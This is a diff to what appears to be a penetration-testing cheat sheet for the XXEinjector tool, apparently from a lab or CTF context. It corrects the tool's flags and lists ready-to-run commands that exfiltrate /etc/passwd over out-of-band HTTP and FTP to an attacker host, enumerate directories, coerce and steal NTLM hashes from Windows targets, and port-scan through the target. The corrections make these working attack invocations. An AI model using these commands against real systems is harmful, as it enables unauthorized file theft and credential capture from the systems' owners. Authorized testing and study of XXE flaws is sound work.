@@ -55,15 +55,16 @@ ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
 ruby XXEinjector.rb --host=10.10.14.5 --ftpport=2121 \
   --file=/tmp/xxe.req --path=/etc/passwd --oob=ftp
 
-# Direct read (no OOB — response reflected in HTTP reply)
-ruby XXEinjector.rb --file=/tmp/xxe.req --path=/etc/passwd --direct
+# Direct read (no OOB — response reflected in HTTP reply). --direct is NOT a bare
+# flag: it takes the two unique marks that bracket the reflected data in the response.
+ruby XXEinjector.rb --file=/tmp/xxe.req --path=/etc/passwd --direct=UNIQUEMARKSTART,UNIQUEMARKEND
 
 # Enumerate directory
 ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
   --file=/tmp/xxe.req --path=/etc/ --oob=http --phpfilter
 
-# NTLM hash coercion (Windows targets)
-ruby XXEinjector.rb --host=10.10.14.5 --file=/tmp/xxe.req --ntlm
+# NTLM hash coercion (Windows targets) — the flag is --hashes, there is no --ntlm
+ruby XXEinjector.rb --host=10.10.14.5 --file=/tmp/xxe.req --hashes
 
 # Custom HTTP port on target side
 ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
@@ -84,11 +85,13 @@ ruby XXEinjector.rb --host=10.10.14.5 --httpport=8000 \
 | `--oob=http` | Use OOB HTTP exfiltration |
 | `--oob=ftp` | Use OOB FTP exfiltration |
 | `--phpfilter` | Wrap in PHP filter (base64) for binary-safe read |
-| `--direct` | Direct read (reflected in response) |
-| `--ntlm` | Coerce NTLM auth to your host |
-| `--enum` | Enumerate instead of reading |
+| `--direct=S,E` | Direct read; **takes two marks** (`start,end`) bracketing the reflected data |
+| `--hashes` | Steal/coerce NTLM auth to your host (**not** `--ntlm`) |
+| `--enumports=all` | Port-scan the target via OOB (`--enumports`; there is no `--enum`) |
 | `--rport` | Target HTTP port (default 80) |
 | `--ssl` | Use HTTPS |
+
+> [!warning] Directory enumeration isn't a separate flag — point `--path` at a directory (e.g. `--path=/etc/`) and XXEinjector lists it. `--enum`, `--ntlm`, and a bare `--direct` do **not** exist; the correct forms are above (verified against the enjoiz/XXEinjector README).
 
 ---
 
@@ -121,5 +124,5 @@ Check Kali HTTP server for a callback. If it hits, the endpoint is vulnerable an
 ---
 
 *Created: 2026-03-13*
-*Updated: 2026-08-18*
+*Updated: 2026-08-31*
 *Model: claude-opus-5*
